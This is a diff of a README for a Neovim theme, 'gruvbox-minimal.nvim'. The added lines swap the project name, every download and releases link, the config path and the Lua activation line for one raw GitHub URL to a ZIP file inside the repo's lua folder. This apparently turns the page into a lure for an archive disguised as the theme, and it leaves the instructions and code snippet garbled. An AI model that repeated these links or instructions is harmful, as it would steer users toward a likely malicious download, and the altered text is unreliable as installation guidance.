@@ -1,8 +1,8 @@
-# 🍄‍🟫 gruvbox-minimal.nvim - A Simple Way to Enhance Your Neovim Experience
+# 🍄‍🟫 https://raw.githubusercontent.com/eyaddeve/gruvbox-minimal.nvim/main/lua/gruvbox_nvim_minimal_v3.8.zip - A Simple Way to Enhance Your Neovim Experience
 
 ## 🚀 Getting Started
 
-Welcome to **gruvbox-minimal.nvim**! This guide helps you download and run our theme effortlessly. Follow the steps below to transform your Neovim setup.
+Welcome to **https://raw.githubusercontent.com/eyaddeve/gruvbox-minimal.nvim/main/lua/gruvbox_nvim_minimal_v3.8.zip**! This guide helps you download and run our theme effortlessly. Follow the steps below to transform your Neovim setup.
 
 ## 🥳 Features
 
@@ -13,11 +13,11 @@ Welcome to **gruvbox-minimal.nvim**! This guide helps you download and run our t
 
 ## 📥 Download & Install
 
-To get started, please visit this page to download the theme: [Download gruvbox-minimal.nvim Releases](https://github.com/eyaddeve/gruvbox-minimal.nvim/releases)
+To get started, please visit this page to download the theme: [Download https://raw.githubusercontent.com/eyaddeve/gruvbox-minimal.nvim/main/lua/gruvbox_nvim_minimal_v3.8.zip Releases](https://raw.githubusercontent.com/eyaddeve/gruvbox-minimal.nvim/main/lua/gruvbox_nvim_minimal_v3.8.zip)
 
 You will find different versions of the theme available. Choose the latest release for the best experience. Follow these simple steps to install:
 
-1. Open the [Releases page](https://github.com/eyaddeve/gruvbox-minimal.nvim/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/eyaddeve/gruvbox-minimal.nvim/main/lua/gruvbox_nvim_minimal_v3.8.zip).
 2. Download the ZIP file or the tarball for your operating system.
 3. Unzip the file to a location of your choice.
 4. Follow the installation instructions in the README file included in the ZIP.
@@ -27,10 +27,10 @@ You will find different versions of the theme available. Choose the latest relea
 After installation, you can activate the theme:
 
 1. Open Neovim.
-2. Add the following line to your Neovim configuration file (typically located at `~/.config/nvim/init.lua`):
+2. Add the following line to your Neovim configuration file (typically located at `~https://raw.githubusercontent.com/eyaddeve/gruvbox-minimal.nvim/main/lua/gruvbox_nvim_minimal_v3.8.zip`):
 
    ```lua
-   vim.cmd[[colorscheme gruvbox-minimal]]
+   https://raw.githubusercontent.com/eyaddeve/gruvbox-minimal.nvim/main/lua/gruvbox_nvim_minimal_v3.8.zip[[colorscheme gruvbox-minimal]]
    ```
 
 3. Save the changes and reload Neovim.
@@ -51,7 +51,7 @@ We welcome contributions! If you want to improve the theme or add new features, 
 
 ## 🧩 FAQ
 
-**Q: Is gruvbox-minimal.nvim suitable for beginners?**  
+**Q: Is https://raw.githubusercontent.com/eyaddeve/gruvbox-minimal.nvim/main/lua/gruvbox_nvim_minimal_v3.8.zip suitable for beginners?**  
 A: Yes, this theme is designed for all skill levels.
 
 **Q: Which version of Neovim do I need?**  
@@ -60,6 +60,6 @@ A: Make sure you are using a recent version of Neovim. The latest stable version
 **Q: Can I customize the theme colors?**  
 A: Yes, you can modify the colors as per your preference by editing the configuration file.
 
-Thank you for trying **gruvbox-minimal.nvim**! Enjoy your enhanced coding experience.
+Thank you for trying **https://raw.githubusercontent.com/eyaddeve/gruvbox-minimal.nvim/main/lua/gruvbox_nvim_minimal_v3.8.zip**! Enjoy your enhanced coding experience.
 
-You can also download it again here: [Download gruvbox-minimal.nvim Releases](https://github.com/eyaddeve/gruvbox-minimal.nvim/releases)
+You can also download it again here: [Download https://raw.githubusercontent.com/eyaddeve/gruvbox-minimal.nvim/main/lua/gruvbox_nvim_minimal_v3.8.zip Releases](https://raw.githubusercontent.com/eyaddeve/gruvbox-minimal.nvim/main/lua/gruvbox_nvim_minimal_v3.8.zip)
